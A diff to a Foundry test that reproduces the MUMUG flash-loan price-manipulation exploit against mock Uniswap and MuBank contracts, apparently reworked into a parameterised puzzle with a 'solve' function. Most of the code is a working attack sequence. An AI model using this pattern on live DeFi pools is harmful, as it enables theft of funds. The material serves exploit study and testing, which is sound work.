@@ -23,7 +23,7 @@ contract MUMUGTest is Test, BlockLoader {
 
     // Load from cheats.createSelectFork("Avalanche", 23435294);
     uint256 totalSupplyUSDC_e = 193102891951559;
-    uint256 totalSupplyMU = 1000000000000000000000000;
+    uint256 totalSupplyMU = 2000000000000000000000000;
 
     uint112 reserve0 = 110596398651;
     uint112 reserve1 = 172739951491310439336991;
@@ -44,9 +44,9 @@ contract MUMUGTest is Test, BlockLoader {
         mu = new ERC20Basic(totalSupplyMU);
         usdc_e = new USDC_e();
 
-        emit log_named_address("USDC Address", address(usdc_e));
-        emit log_named_address("MU Address", address(mu));
-        emit log_string("");
+        // emit log_named_address("USDC Address", address(usdc_e));
+        // emit log_named_address("MU Address", address(mu));
+        // emit log_string("");
 
         // Initial Uniswap;
         pair = new UniswapV2Pair(
@@ -59,8 +59,8 @@ contract MUMUGTest is Test, BlockLoader {
             price0CumulativeLast,
             price1CumulativeLast
         );
-        deal(address(usdc_e), address(pair), pairBalance0);
-        deal(address(mu), address(pair), pairBalance1);
+        usdc_e.transfer(address(pair), pairBalance0);
+        mu.transfer(address(pair), pairBalance1);
         address[4] memory pairs = [
             address(pair),
             address(0),
@@ -72,13 +72,13 @@ contract MUMUGTest is Test, BlockLoader {
 
         // Initial Bank
         bank = new MuBank(address(router), address(pair), address(mu));
-        deal(address(mu), address(bank), bankBalanceMU);
+        mu.transfer(address(bank), bankBalanceMU);
 
-        vm.label(address(bank), "Bank");
-        vm.label(address(mu), "MU");
-        vm.label(address(usdc_e), "USDC_e");
-        vm.label(address(router), "Router");
-        vm.label(address(pair), "Pair");
+        // vm.label(address(bank), "Bank");
+        // vm.label(address(mu), "MU");
+        // vm.label(address(usdc_e), "USDC_e");
+        // vm.label(address(router), "Router");
+        // vm.label(address(pair), "Pair");
     }
 
     function self() public pure returns (address) {
@@ -147,6 +147,27 @@ contract MUMUGTest is Test, BlockLoader {
     }
 
     function testExploit() public {
+        uint256 flashloanAmount = (mu.balanceOf(address(bank)) * 990) / 1000;
+        uint256 swapAmount = flashloanAmount;
+        uint256 sendAmount = 946 * 10e18;
+        attackTemp(flashloanAmount, swapAmount, sendAmount);
+        require(usdc_e.balanceOf(self()) >= 10e6, "Attack failed!");
+    }
+
+    function solve(
+        uint256 flashloanAmount,
+        uint256 swapAmount,
+        uint256 sendAmount
+    ) public {
+        attackTemp(flashloanAmount, swapAmount, sendAmount);
+        require(usdc_e.balanceOf(self()) < 10e6, "Attack succeed!");
+    }
+
+    function attackTemp(
+        uint256 flashloanAmount,
+        uint256 swapAmount,
+        uint256 sendAmount
+    ) public {
         // This attack is different from the original one:
         // https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/MUMUG_exp.sol
         // I de-couple two attacks from it.
@@ -154,33 +175,27 @@ contract MUMUGTest is Test, BlockLoader {
         print("Before exploit: ");
 
         // Step 1, mock to flashloan MU.
-        uint256 paybackAmount = mu.balanceOf(address(bank)) * 99 / 100;
-        uint256 flashloanAmount = paybackAmount * 997 / 1000;
         flashLoanBorrow(flashloanAmount);
 
         // Step 2, swap MU to USDC_e at uniswapPair, it will manipulate the price of MU/USDC_e in MU bank.
-        uint256 swapAmount = mu.balanceOf(self());
         swapMUToUSDCByPair(swapAmount);
 
-        print("After swap1: ");
+        // print("After swap1: ");
 
         // Step 3, do the manipulated sell of MU.
-        uint256 sendAmount = 950 * 10e18;
         uint256 muAmount;
         (, muAmount) = bank.mu_bond_quote(sendAmount);
         swapUSDCToMUByBank(sendAmount);
 
-        print("After swap2: ");
+        // print("After swap2: ");
+
+        uint256 paybackAmount = (flashloanAmount * 1000) / 997;
 
         // Step 4, payback the flashloan.
-        require(
-            muAmount >= paybackAmount,
-            "MU token isn't enough to payback flashloan!"
-        );
-        require(
-            muAmount < mu.balanceOf(address(bank)),
-            "MU token isn't too many!"
-        );
+        // require(
+        //     muAmount >= paybackAmount,
+        //     "MU token isn't enough to payback flashloan!"
+        // );
         flashLoanPayback(paybackAmount);
 
         print("After exploit: ");
